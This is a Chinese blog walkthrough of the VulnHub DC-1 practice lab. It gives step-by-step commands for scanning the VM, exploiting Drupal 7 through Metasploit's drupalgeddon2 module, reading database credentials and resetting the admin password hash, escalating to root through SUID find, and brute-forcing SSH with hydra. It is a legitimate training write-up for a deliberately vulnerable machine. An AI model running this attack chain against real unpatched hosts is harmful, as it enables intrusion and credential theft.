
--- 
title:  [ vulnhub靶机通关篇 ] 渗透测试综合靶场 DC-1 通关详解 (附靶机搭建教程) 
tags: []
categories: [] 

---
>  
 <h2>🍬 博主介绍</h2> 
 👨‍🎓 博主介绍：大家好，我是  ，很高兴认识大家~ ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！ 




#### 文章目录
- - - <ul><li>- - - - - - - - <ul><li>- - - - - - - - - - - - - - 


## 一、环境搭建：

### 1、靶机描述

```
DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.
It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.
To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.
There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.
There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory. You don't even need to be root to do this, however, you will require root privileges.
Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.
Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.

```

>  
 根据描述信息我们可以知道本靶场环境总共有5个flag。 


### 2、下载靶场环境

>  
 靶场下载地址： 


```
https://www.vulnhub.com/entry/dc-1,292/

```

>  
 下载下来的文件如下 


<img src="https://img-blog.csdnimg.cn/e1046a08c59e471ca7f2996160c0d362.png" alt="在这里插入图片描述">

### 3、启动靶场环境

>  
 下载下来是虚拟机压缩文件，直接用Vmvare导入就行。 <img src="https://img-blog.csdnimg.cn/c19d29ce654947cb8499fa34070ca6bc.png" alt="在这里插入图片描述"> 


>  
 设置虚拟机名称 


<img src="https://img-blog.csdnimg.cn/14dabe4eeeb54ae08795952668a5a0e1.png" alt="在这里插入图片描述">

>  
 导入中 


<img src="https://img-blog.csdnimg.cn/8433003515b34a89a34c616269613148.png" alt="在这里插入图片描述">

>  
 导入完成之后打开后把网络模式设置为NAT模式。 


<img src="https://img-blog.csdnimg.cn/1cb5707c05c848bca94e69c54b63a76a.png" alt="在这里插入图片描述">

>  
 虚拟机开启之后界面如下，我们不知道ip，需要自己探活，网段知道：192.168.233.0/24 


<img src="https://img-blog.csdnimg.cn/9d2a038830624057b171ad519fa8bdc0.png" alt="在这里插入图片描述">

## 二、渗透靶场

>  
 本环境重在在于如下两个知识点 Drupal 7 漏洞利用 find 提权 


### 1、目标：

>  
 目标就是我们搭建的靶场，靶场IP为：192.168.233.0/24 


### 2、信息收集：寻找靶机真实IP

```
nmap -sP 192.168.233.0/24

```

<img src="https://img-blog.csdnimg.cn/d6ea2eb607294370a17ed54a00eda9ae.png" alt="在这里插入图片描述">

>  
 本机ip为192.168.233.130 所以分析可得靶机ip为192.168.233.177 


### 3、信息收集：探端口及服务

```
nmap -A -p- -v 192.168.233.177

```

<img src="https://img-blog.csdnimg.cn/104d806362b24decb7627f8084f07f10.png" alt="在这里插入图片描述">

<img src="https://img-blog.csdnimg.cn/361184fb2c604781b113acb95cc7f9f4.png" alt="在这里插入图片描述">

>  
 发现开放了22算口，开放了ssh服务，OpenSSH 6.0p1 发现开放了80端口，存在web服务，Apache httpd 2.2.22，Drupal 7 发现开放了111端口，开放了rpcbind服务 


### 4、访问web站点

```
http://192.168.233.177/

```

>  
 发现是一个电信的drupal服务，根据nmap结果可知当前运行的是Drupal 7的CMS 


<img src="https://img-blog.csdnimg.cn/9d4da841cb8740f1a2ba04c56544ac52.png" alt="在这里插入图片描述">

### 5、利用MSF渗透

>  
 典型的drupal，由于我们这里是老外搭建的靶机，所以就纯kali渗透即可，启动Metersploit MSF存在drupal模块，尝试使用msf渗透 


#### 1.MSF简单命令介绍

```
msfconsole		进入MSF控制台
search 			搜索相应模块
use           	对应模块
show options  	查看信息
set RHOST  		远程主机ip
run           	攻击

```

#### 2.搜索Drupal 7的漏洞

>  
 搜索Drupal 7的漏洞发现可利用的漏洞很多 


```
searchsploit Drupa 7

```

<img src="https://img-blog.csdnimg.cn/c7ffda81418c4bd5b860d5ffe06f3a4e.png" alt="在这里插入图片描述">

#### 3.进入MSF控制台搜索drupal模块

>  
 进入MSF控制台 


```
msfconsole

```

<img src="https://img-blog.csdnimg.cn/b3dd571c09844aba93f8a871495c6430.png" alt="在这里插入图片描述">

>  
 搜索drupal模块 


```
search drupal

```

<img src="https://img-blog.csdnimg.cn/751a16e59eea4458bc30135d36ade7aa.png" alt="在这里插入图片描述">

#### 4.选择模块进行测试

>  
 用2018的测试 


```
use exploit/unix/webapp/drupal_drupalgeddon2

```

<img src="https://img-blog.csdnimg.cn/403abfd4d9664c3c8f8ad697ca1d6417.png" alt="在这里插入图片描述">

#### 5.设置靶机IP运行msf

```
set rhosts 192.168.233.177

```

<img src="https://img-blog.csdnimg.cn/a13c9a62b67a4681b429dddc7631bb65.png" alt="在这里插入图片描述">

>  
 运行msf 


```
run 

```

<img src="https://img-blog.csdnimg.cn/7f9c3ed7ccc0454d96b4b35a7eebd842.png" alt="在这里插入图片描述">

#### 6.进入shell

```
shell

```

<img src="https://img-blog.csdnimg.cn/289a54bf3fcc4adb9dd47c4247fe6526.png" alt="在这里插入图片描述">

#### 7.执行whoami

```
whoami

```

>  
 发现是www-data权限 


<img src="https://img-blog.csdnimg.cn/cbe90834de7747fb942658add87a01eb.png" alt="在这里插入图片描述">

#### 8.发现flag4.txt文件

>  
 进入home目录，发现flag4.txt文件，提示需要提升权限 


<img src="https://img-blog.csdnimg.cn/53bc8685d87845bebee09257c3b919e6.png" alt="在这里插入图片描述">

#### 9.使用python反弹一个交互式shell

```
python -c "import pty;pty.spawn('/bin/bash')"

```

<img src="https://img-blog.csdnimg.cn/2d17f9e026fe471389287608944873dd.png" alt="在这里插入图片描述">

#### 10.发现flag1文件

>  
 查看www目录下文件，发现flag1.txt文件，打开发现提示信息，内容提示寻找站点的配置文件 


```
ls
cat flag1.txt
Every good CMS needs a config file - and so do you

```

<img src="https://img-blog.csdnimg.cn/dacc72b681f846b0897122415167d4d4.png" alt="在这里插入图片描述">

#### 11.发现flag2

>  
 Drupal的默认配置文件为 


```
/var/www/sites/default/settings.php

```

<img src="https://img-blog.csdnimg.cn/568777d70e1d4da9b92579d964dfacba.png" alt="在这里插入图片描述">

>  
 查看文件内容 


```
cat /var/www/sites/default/settings.php

```

>  
 发现了flag2和数据库的账号密码 


```
'database' =&gt; 'drupaldb',
      'username' =&gt; 'dbuser',
      'password' =&gt; 'R0ck3t',
      'host' =&gt; 'localhost',
      'port' =&gt; '',
      'driver' =&gt; 'mysql',
      'prefix' =&gt; '',

```

>  
 flag2提示，提升权限为root来查看敏感文件，或者直接爆破 


<img src="https://img-blog.csdnimg.cn/f3e4e2f6a7bb42bd959d916bb788a600.png" alt="在这里插入图片描述">

>  
 我们先进入数据库查看 


```
mysql -u dbuser -p

```

<img src="https://img-blog.csdnimg.cn/d015e625d6284812b252547397d603f0.png" alt="在这里插入图片描述">

>  
 查看数据库，切换到drupaldb数据库 


```
databases;
use drupaldb;

```

<img src="https://img-blog.csdnimg.cn/0775e76c249d4d9ea1ddeee6ba7fc59b.png" alt="在这里插入图片描述">

>  
 查看查找默认的Drupal user 表 


```
select * from users;

```

>  
 发现admin信息 


<img src="https://img-blog.csdnimg.cn/16f4689203e846d59be2a50c77e05044.png" alt="在这里插入图片描述"> <img src="https://img-blog.csdnimg.cn/516c693542c04941b65679e5b154a993.png" alt="在这里插入图片描述">

>  
 置换drupal密码 


```
http://drupalchina.cn/node/2128

```

>  
 进入www目录 


```
quit;

```

<img src="https://img-blog.csdnimg.cn/26f7ce6bb1e542428da457e66b1fcce2.png" alt="在这里插入图片描述">

>  
 站点路径下执行 


```
php scripts/password-hash.sh 新密码

```

<img src="https://img-blog.csdnimg.cn/efc5557daeed4b8e980293d46f74b4f1.png" alt="在这里插入图片描述">

>  
 然后在进入数据库中把密码字段进行替换 进入mysql，输入密码，切换到drupaldb数据库 


```
mysql -u dbuser -p
R0ck3t
use drupaldb

```

<img src="https://img-blog.csdnimg.cn/2b3f69cd13e74fb8b01c93b652cd7804.png" alt="在这里插入图片描述">

>  
 将pass字段进行替换 


```
update users set pass="$S$DW/j0Hhhx6pIBV4ZkoBp3mv/5l8reTwEBdpgzB/x8awTYUfFkd2k" where name="admin";

```

<img src="https://img-blog.csdnimg.cn/2b7dbe17ddf147c58c28985017aee2da.png" alt="在这里插入图片描述">

#### 12.登录站点

>  
 访问站点 


```
http://192.168.233.177/

```

<img src="https://img-blog.csdnimg.cn/ce79ffcc849143879e3c3576e9678376.png" alt="在这里插入图片描述">

>  
 进行登录，密码是之前我们自己替换的，账号是admin 


```
admin
111111

```

>  
 成功登录 


<img src="https://img-blog.csdnimg.cn/f9d539b39074482c97f729c2f600e60e.png" alt="在这里插入图片描述">

#### 13.发现flag3

>  
 登陆战点之后，随便翻一番，发现flag3， 


```
http://192.168.233.177/node#overlay=admin/content

```

<img src="https://img-blog.csdnimg.cn/535c18b67de44e6eaf06369ac15bdc7b.png" alt="在这里插入图片描述">

>  
 点击flag3进入，发现提示信息 


```
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
大致意思是提权并提示 -exec，想到suid提权 find 命令

```

<img src="https://img-blog.csdnimg.cn/345c3eede0fb403596a536e2849687d9.png" alt="在这里插入图片描述">

>  
 使用命令查看 suid 权限的可执行二进制程序 


```
find / -perm -4000 2&gt;/dev/null

```

>  
 发现find命令 


<img src="https://img-blog.csdnimg.cn/d21f7309a7a54250aaaca6fb91991c75.png" alt="在这里插入图片描述">

>  
 使用命令测试，发现为root权限 


```
touch 666
ls
find / -name 666 -exec "whoami" \;

```

<img src="https://img-blog.csdnimg.cn/c39b066cd20c427b85fb1e2b181b363a.png" alt="在这里插入图片描述">

#### 14.发现最后的flag文件

>  
 我们切换语句进入shell，执行whoami查看当前权限，执行ls查看当前目录下文件，切换到root目录，查看文件，发现cat thefinalflag.txt文件。 


```
find / -name 666 -exec "/bin/sh" \;   
whoami
ls
cd /root
ls

```

<img src="https://img-blog.csdnimg.cn/6c52ef4141af46bb9a01da7dbb997612.png" alt="在这里插入图片描述">

>  
 查看cat thefinalflag.txt文件 


```
cat thefinalflag.txt

```

>  
 文件内容如下 


```
Well done!!!
干得好！
Hopefully you've enjoyed this and learned some new skills.
希望你已经享受了这一点，并学到了一些新的技能。
You can Let me know what you thought of this little journey
你可以告诉我你对这段小旅程的看法
by_ contacting me via Twitter
通过twitter联系我
QDCAU7
QDCAU7

```

>  
 大致就是说你已经通过了本关卡。 


<img src="https://img-blog.csdnimg.cn/f467bd54d38948dd9b2c254e31a5ab95.png" alt="在这里插入图片描述">

#### 15.发现flag4

>  
 此时我们查看 /etc/passwd 文件，发现存在 flag4 用户，我们也可以使用 hydra 进行爆破 


```
cat /etc/passwd

```

<img src="https://img-blog.csdnimg.cn/d35ecffa96664ae3b731b801d50a50d2.png" alt="在这里插入图片描述">

```
hydra -l flag4 -P /root/Desktop/pass.txt ssh://192.168.233.177

```

>  
 解释一下: 


```
-l 指定用户名
-P 加载密码字典（自定义)
ssh://ip 指定使用协议和ip地址

```

<img src="https://img-blog.csdnimg.cn/9f5ed306da4a49c1a4669b41a1b66af9.png" alt="在这里插入图片描述">

>  
 SSH连接登录，拿到flag4权限 


```
ssh flag4@192.168.233.177

```

<img src="https://img-blog.csdnimg.cn/27d94c593a4f4f1db75e04637d326a5c.png" alt="在这里插入图片描述">

## 三、相关资源

  
